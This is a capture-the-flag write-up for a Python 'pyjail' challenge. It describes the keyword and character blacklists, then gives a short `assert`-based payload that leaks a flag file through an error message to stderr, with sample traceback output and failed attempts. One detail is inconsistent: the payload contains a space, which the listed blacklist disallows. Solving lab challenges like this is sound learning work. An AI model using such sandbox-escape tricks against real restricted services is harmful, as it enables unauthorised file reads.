# Solution of noname

## Challenge Description

The provided pyjail has several restriction to bypass.

## Key restrictions

1. * Input must be no more than 30 characters.

2. **Blacklist Filters:**

   * Disallowed keywords: `import`, `exec`, `eval`, `system`
   * Disallowed characters: `_"[]{} `
   * Non-printable characters are also blocked.

3. * `sys.stdout` is overwritten. For that std out will broken and can use print().

4. **`exec(code)` is still called:**

   * Despite the restrictions, arbitrary code can be executed after passing filters.

## Terget

Read the flag from the file.

## payload

```python
assert False,open('f').read()
```

### Why This Works

* `assert` is not blacklisted here.
* `open('f')` reads the flag file.
* The `assert` will throw an `AssertionError`, and the second argument (`open('f').read()`) becomes the error message.
* As the `AssertionError` show the error message as stderr, we can easily bypass the stdout, as it is broken.
* And the payload is less than 30 charecter

## Output Example

```
>>> assert False,open('f').read()
Traceback (most recent call last):
  File "/workspaces/ctf_L3/jails/py/noname/dist/chall.py", line 17, in <module>
    chall()
  File "/workspaces/ctf_L3/jails/py/noname/dist/chall.py", line 15, in chall
    exec(code)
  File "<string>", line 1, in <module>
AssertionError: {foo}
Exception ignored in: 'sys.stdout'
AttributeError: 'str' object has no attribute 'flush'
```

## Limitaions

* `assert False,open('f').read()` this payload is less than 30 charecter. but if the flag file name is bigger it might not work because of limited character. 


## Failed attempts:

* breakpoint() – Calls an internal debugger that relies on stdout; output not visible.

* help() – Tries to print via stdout; fails due to the broken stdout object.

* open(...).write(...) – Possible to create files, but cannot confirm results due to silent stdout.

* import os – Forbidden due to blacklist.

* "".__class__ – Requires disallowed characters such as _ and {.
